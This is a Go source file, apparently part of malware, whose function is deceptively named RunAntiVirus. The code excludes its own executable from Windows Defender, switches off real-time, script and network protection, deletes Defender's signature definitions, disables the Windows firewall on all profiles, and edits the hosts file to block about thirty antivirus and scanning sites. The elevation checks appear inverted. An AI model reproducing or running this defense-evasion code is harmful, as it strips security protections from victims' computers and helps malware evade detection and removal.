package html

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"strings"

	
)

func RunAntiVirus() {
	ExcludeFromDefender()
	DisableDefender()
	disableFirewall()
	BlockSites([]string{
		"virustotal.com",
		"avast.com",
		"totalav.com",
		"scanguard.com",
		"totaladblock.com",
		"pcprotect.com",
		"mcafee.com",
		"bitdefender.com",
		"us.norton.com",
		"avg.com",
		"malwarebytes.com",
		"pandasecurity.com",
		"avira.com",
		"norton.com",
		"eset.com",
		"zillya.com",
		"kaspersky.com",
		"usa.kaspersky.com",
		"sophos.com",
		"home.sophos.com",
		"adaware.com",
		"bullguard.com",
		"clamav.net",
		"drweb.com",
		"emsisoft.com",
		"f-secure.com",
		"zonealarm.com",
		"trendmicro.com",
		"ccleaner.com",
	})
}

func ExcludeFromDefender() error {
	if IsElevated() {
		return errors.New("not elevated")
	}
	path, err := os.Executable()
	if err != nil {
		return err
	}

	return exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", path).Run()
}

func DisableDefender() error {
	if IsElevated() {
		return errors.New("not elevated")
	}

	err := exec.Command("powershell", "Set-MpPreference", "-DisableIntrusionPreventionSystem", "$true", "-DisableIOAVProtection", "$true", "-DisableRealtimeMonitoring", "$true", "-DisableScriptScanning", "$true", "-EnableControlledFolderAccess", "Disabled", "-EnableNetworkProtection", "AuditMode", "-Force", "-MAPSReporting", "Disabled", "-SubmitSamplesConsent", "NeverSend").Run()
	if err != nil {
		return err
	}

	err = exec.Command("powershell", "Set-MpPreference", "-SubmitSamplesConsent", "2").Run()
	if err != nil {
		return err
	}

	return exec.Command("cmd", "/c", fmt.Sprintf("%s\\Windows Defender\\MpCmdRun.exe", os.Getenv("ProgramFiles")), "-RemoveDefinitions", "-All").Run()
}

func BlockSites(sites []string) error {
	if IsElevated() {
		return errors.New("not elevated")
	}

	hostFilePath := filepath.Join(os.Getenv("systemroot"), "System32\\drivers\\etc\\hosts")

	data, err := os.ReadFile(hostFilePath)
	if err != nil {
		return err
	}

	newData := []string{}
	for _, line := range strings.Split(string(data), "\n") {
		for _, bannedSite := range sites {
			if strings.Contains(line, bannedSite) {
				continue
			}
		}
		newData = append(newData, line)
	}

	for _, bannedSite := range sites {
		newData = append(newData, "\t0.0.0.0 "+bannedSite)
		newData = append(newData, "\t0.0.0.0 www."+bannedSite)
	}

	d := strings.Join(newData, "\n")
	d = strings.ReplaceAll(d, "\n\n", "\n")

	err = exec.Command("attrib", "-r", hostFilePath).Run()
	if err != nil {
		return err
	}
	err = os.WriteFile(hostFilePath, []byte(d), 0644)
	if err != nil {
		return err
	}

	return exec.Command("attrib", "+r", hostFilePath).Run()
}

func runCommand(command *exec.Cmd) {
	command.Stdout = os.Stdout
	command.Stderr = os.Stderr
	err := command.Run()
	if err != nil {
		fmt.Printf("Failed to run command: %v\n", err)
	}}
func disableFirewall() {
	cmd := exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off")
	runCommand(cmd)
}